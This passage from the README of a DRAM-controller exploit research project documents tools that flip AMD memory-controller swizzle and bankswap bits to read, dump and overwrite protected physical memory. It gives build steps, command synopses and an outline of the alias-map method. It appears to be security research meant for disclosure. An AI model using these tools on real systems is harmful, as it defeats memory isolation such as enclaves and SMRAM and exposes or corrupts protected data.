read the patch can write it — and this copy is the one the core reloads coming
out of idle.

What you do next is up to your imagination.

---

## Build

```
make        # builds kernel/spaghettify.ko and all userspace tools
make clean
```

---

## Usage

Run as root. Full details in [USAGE.md](USAGE.md).

### `dram_read`

Simple read from a protected memory address.

Push the `--do-swizzle` / `--do-bankswap` flips into the DRAM controller to
enter the spaghettified memory view, read one dword from physical address
`<pa>`, restore the DCT bits, and return the value.

```
dram_read
    --pa <pa>
    --do-swizzle <0|1>
    --do-bankswap <0|1>
```

### `dram_poke`

Write into a protected memory range.

Each `--map` is a solved spaghettification from `unspaghettify.py --save-map`,
itself fed by alias pairs collected by `gather_aliases.py`; the alias for every
dword in the protected range is recovered from the map via a GF(2)
pseudo-inverse computed once at startup. Pass multiple maps — one per
`(at_swizzle, at_bankswap)` gathered on the same hardware — to widen coverage,
since each spaghettification leaves a different set of rank-deficient holes and
the first map that reaches a given dword wins.

```
dram_poke
    [--dangerously-skip-calibration]
    [--calibrate-pa <hex>]
    [--strict-holes]
    [--no-verify]
    [--ignore-fw-mismatch]
    [--fenced-range <lo>,<hi>]
    [--allow-fenced-alias]
    -s, --protected-pa <pa>
    -l, --length <n>
    --map <file> [--map <file>]...
    < in.bin
```

### `dram_dump`

Read from a protected memory range.

Same `--map` machinery as `dram_poke`: each map is a solved spaghettification
from `unspaghettify.py --save-map`, the alias for every dword is recovered via
a one-shot GF(2) pseudo-inverse, and multiple maps gathered at different
`(at_swizzle, at_bankswap)` widen coverage where one map's rank-deficient
holes are filled by another's.

```
dram_dump
    [--dangerously-skip-calibration]
    [--calibrate-pa <hex>]
    [--dry-run]
    [--ignore-fw-mismatch]
    [--fenced-range <lo>,<hi>]
    [--allow-fenced-alias]
    -s, --protected-pa <pa>
    -l, --length <n>
    --map <file> [--map <file>]...
```

The full toolchain — `dram_state`, `dram_carveouts`, and `dram_alias`; the
`gather_aliases.py` / `unspaghettify.py` analysis pipeline; worked end-to-end
examples; and the internals — is documented in **[USAGE.md](USAGE.md)**.

---

## The shared pipeline

`skitter-creek-bath-salts` explores how the final stages of the MCT/DCT
transforms can topple the security of everything built above it. The exploit
demonstrated here is one configuration register on AMD Family 16h, picked
because the datasheets gave enough to begin. The *pipeline* it broke is
everywhere.

Channel interleave, rank interleave, bank interleave, swizzle, chip-select
normalize — every modern memory controller does some version of all of it.
AMD. Intel. ARM. RISC-V. Mobile. Server. Embedded. The same architectural
shape sits underneath everything.

*Above* it all sits SEV, SGX, TDX, TrustZone, CCA realms, pKVM, CoVE, SEP,
the PSP, ME, T-SEG, SMRAM, the C6 stash. Everything sitting in DRAM — even things
walled off and invisible to ring-0 or the CPU itself — rests on the final layers
of a `*p` pipeline we've just begun to explore.

---

## References

* Black Hat 2026 — Spaghettifying DRAM (Coming Soon)

---

## Author

`skitter-creek-bath-salts` is a research effort from Christopher Domas ([@xoreaxeaxeax](https://x.com/xoreaxeaxeax/))

---

![Experiment](examples/skitter-creek-bath-salts.jpg)

---